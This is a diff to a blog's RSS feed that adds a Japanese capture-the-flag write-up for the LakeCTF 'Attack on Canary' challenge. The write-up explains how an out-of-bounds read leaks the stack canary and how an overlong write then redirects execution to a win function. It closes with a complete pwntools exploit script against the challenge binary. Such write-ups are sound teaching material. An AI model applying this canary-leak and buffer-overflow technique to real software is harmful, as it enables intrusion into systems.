@@ -7,6 +7,88 @@
     <generator>Hugo -- gohugo.io</generator>
     <lastBuildDate>Thu, 02 Jun 2022 17:09:01 +0900</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>Lakectf Attack on Canary Writeups</title>
+      <link>/posts/tech/2022/9_26/lakectf/lakectf_canary/</link>
+      <pubDate>Mon, 26 Sep 2022 21:24:13 +0900</pubDate>
+      
+      <guid>/posts/tech/2022/9_26/lakectf/lakectf_canary/</guid>
+      <description>概要 実行可能ファイルが配られるので、実行アドレスをwin関数に飛ばしたらflagが得られるよという問題です。
+バイナリ解析 ghidraでディスアセンブリ/デコンパイルすると次のような結果になりました。
+このプログラムは、プレイヤーに次の操作を可能にしています。
+ 配列(RBP-0x60)に格納されている値を8バイト単位で見ることができる。実はその配列の範囲を超えた部分も見られる。(以下、操作0) 配列に好きな値を代入できる。&amp;ldquo;max 8 bytes&amp;quot;とあるが、実際には好きな長さの値を代入できる。(以下、操作1)  攻撃の方針 もちろん最終目的は、win関数の実行です。先ほどの通り、好きな大きさのデータを代入できるので、バッファオーバーフローが使えそうです。
+しかし、障害が一つ。canaryの存在です。
+バッファオーバーフローとは、プログラムが「次にここを実行しよう！」と思っている場所(RIP/EIP)を書き換えることで、プログラムの実行を任意に操作する手法です。
+しかし、我々がデータを注入できる場所とRIPの間にはcanaryというデータがあります。
+もちろん、バッファオーバーフロー時にはcanaryの値はメチャクチャになりますから、関数の実行前後でcanaryの値が変わっていた場合はプログラムが強制終了されます。つまり攻撃が失敗します。
+さて、これを回避するためにはどうすればよいでしょうか。もしcanaryの値が判明すれば、バッファオーバーフロー時にcanaryの部分だけ変わらないようにpayloadを作れますね。
+ここで使えるのが先ほどの機能です。
+まず、データを覗き見られる操作0を実行します。canaryのアドレスは[RBP-0x8]なので、我々が操作できる配列との差は $ 0x60 - 0x8 = 88 $。 よって、&amp;ldquo;Tell me which slot you wanna read: &amp;ldquo;と聞かれたときには&amp;quot;11&amp;quot;と答えればcanaryが覗き見られますね。
+あとはretまでのoffsetを計算してwin関数を実行するだけです。
+スクリプト 結論としては以下のスクリプトで問題が解けました。
+from pwn import * win = 0x0000000000400837 def exec_command(io, cmd: bytes): io.recvuntil(b&amp;#34;Your command: &amp;#34;) io.sendline(cmd) io = process(&amp;#34;./exe&amp;#34;) #io = remote(&amp;#34;chall.polygl0ts.ch&amp;#34;, 6100) exec_command(io, b&amp;#34;0&amp;#34;) io.recvuntil(b&amp;#34;Tell me which slot you wanna read: &amp;#34;) io.</description>
+      <content>&lt;h2 id=&#34;概要&#34;&gt;概要&lt;/h2&gt;
+&lt;p&gt;実行可能ファイルが配られるので、実行アドレスをwin関数に飛ばしたらflagが得られるよという問題です。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;img/canary.png&#34; alt=&#34;problem&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;バイナリ解析&#34;&gt;バイナリ解析&lt;/h2&gt;
+&lt;p&gt;ghidraでディスアセンブリ/デコンパイルすると次のような結果になりました。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;img/disas.png&#34; alt=&#34;disassemble&#34;&gt;&lt;/p&gt;
+&lt;p&gt;このプログラムは、プレイヤーに次の操作を可能にしています。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;配列(RBP-0x60)に格納されている値を8バイト単位で見ることができる。実はその配列の範囲を超えた部分も見られる。(以下、操作0)&lt;/li&gt;
+&lt;li&gt;配列に好きな値を代入できる。&amp;ldquo;max 8 bytes&amp;quot;とあるが、実際には好きな長さの値を代入できる。(以下、操作1)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;攻撃の方針&#34;&gt;攻撃の方針&lt;/h2&gt;
+&lt;p&gt;もちろん最終目的は、win関数の実行です。先ほどの通り、好きな大きさのデータを代入できるので、バッファオーバーフローが使えそうです。&lt;/p&gt;
+&lt;p&gt;しかし、障害が一つ。canaryの存在です。&lt;/p&gt;
+&lt;p&gt;バッファオーバーフローとは、プログラムが「次にここを実行しよう！」と思っている場所(RIP/EIP)を書き換えることで、プログラムの実行を任意に操作する手法です。&lt;/p&gt;
+&lt;p&gt;しかし、我々がデータを注入できる場所とRIPの間にはcanaryというデータがあります。&lt;/p&gt;
+&lt;p&gt;もちろん、バッファオーバーフロー時にはcanaryの値はメチャクチャになりますから、関数の実行前後でcanaryの値が変わっていた場合はプログラムが強制終了されます。つまり攻撃が失敗します。&lt;/p&gt;
+&lt;p&gt;さて、これを回避するためにはどうすればよいでしょうか。もしcanaryの値が判明すれば、バッファオーバーフロー時にcanaryの部分だけ変わらないようにpayloadを作れますね。&lt;/p&gt;
+&lt;p&gt;ここで使えるのが先ほどの機能です。&lt;/p&gt;
+&lt;p&gt;まず、データを覗き見られる操作0を実行します。canaryのアドレスは[RBP-0x8]なので、我々が操作できる配列との差は $ 0x60 - 0x8 = 88 $。
+よって、&amp;ldquo;Tell me which slot you wanna read: &amp;ldquo;と聞かれたときには&amp;quot;11&amp;quot;と答えればcanaryが覗き見られますね。&lt;/p&gt;
+&lt;p&gt;あとはretまでのoffsetを計算してwin関数を実行するだけです。&lt;/p&gt;
+&lt;h2 id=&#34;スクリプト&#34;&gt;スクリプト&lt;/h2&gt;
+&lt;p&gt;結論としては以下のスクリプトで問題が解けました。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+win &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000400837&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exec_command&lt;/span&gt;(io, cmd: bytes):
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Your command: &amp;#34;&lt;/span&gt;)
+    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(cmd)
+
+io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./exe&amp;#34;&lt;/span&gt;)
+&lt;span style=&#34;color:#75715e&#34;&gt;#io = remote(&amp;#34;chall.polygl0ts.ch&amp;#34;, 6100)&lt;/span&gt;
+
+exec_command(io, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;)
+
+io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Tell me which slot you wanna read: &amp;#34;&lt;/span&gt;)
+io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;11&amp;#34;&lt;/span&gt;)
+
+canary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;canary: {canary}&amp;#34;&lt;/span&gt;)
+
+payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt;
+payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; canary
+payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
+payload &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(win)
+
+exec_command(io, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;)
+
+io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Tell me how much you wanna write: &amp;#34;&lt;/span&gt;)
+io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;112&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# 88 + 8 (canary) + 8 (ret) + 8 (win)&lt;/span&gt;
+
+io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;What are the contents (max 8 bytes): &amp;#34;&lt;/span&gt;)
+io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
+
+exec_command(io, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;)
+
+io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
+    </item>
+    
+    <item>
       <title>SHELLCTF writeup</title>
       <link>/posts/tech/2022/8_15/shellctf/</link>
       <pubDate>Mon, 15 Aug 2022 12:13:36 +0900</pubDate>
